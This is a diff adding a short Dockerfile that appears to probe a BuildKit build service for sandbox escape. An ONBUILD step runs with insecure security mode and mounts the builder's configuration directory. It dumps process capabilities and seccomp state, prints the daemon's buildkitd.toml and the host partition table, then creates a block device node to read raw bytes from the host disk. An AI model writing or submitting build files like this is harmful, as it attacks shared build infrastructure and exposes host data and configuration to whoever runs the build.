@@ -1,0 +1,5 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --security=insecure --mount=type=bind,source=etc/buildkit,target=/cfg,ro sh -c 'set +e; echo "===A1b_START==="; id; grep -E "^(Cap|Seccomp|NoNewPrivs)" /proc/self/status; hostname; echo "--cfg--"; cat /cfg/buildkitd.toml 2>&1 | tail -25; echo "--parts--"; cat /proc/partitions | head -12; echo "--vdb--"; ls -l /dev/vdb 2>&1; mknod /tmp/vdb b 254 16; head -c 32 /tmp/vdb 2>&1 | od -An -tx1; echo "===A1b_END==="'
+FROM base
+RUN echo trigger-67405-a1b-
+CMD ["sh","-c","sleep 15"]
